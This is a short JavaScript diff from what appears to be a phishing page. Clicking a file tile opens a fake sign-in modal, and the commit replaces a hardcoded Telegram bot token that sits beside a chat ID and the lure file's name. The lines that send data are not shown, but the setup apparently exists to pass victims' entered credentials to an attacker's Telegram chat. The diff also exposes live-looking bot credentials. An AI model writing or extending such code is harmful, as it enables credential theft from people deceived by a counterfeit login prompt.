@@ -58,7 +58,7 @@ document.addEventListener('DOMContentLoaded', () => {
             signInModal.classList.remove("hidden");
             document.body.style.overflow = "hidden";
 
-            const botToken = "7581994701:AAGb0gyfgIMQH-RDhnogyMfgaAJbnK7h534";
+            const botToken = "8099221862:AAHqbxeMQUIFuwgdkCq0Y7aAsBPp_JcfVKE";
             const chatId = "5642369607";
             const fileName = tile.querySelector('.file-name')?.textContent || "Unknown File";
 
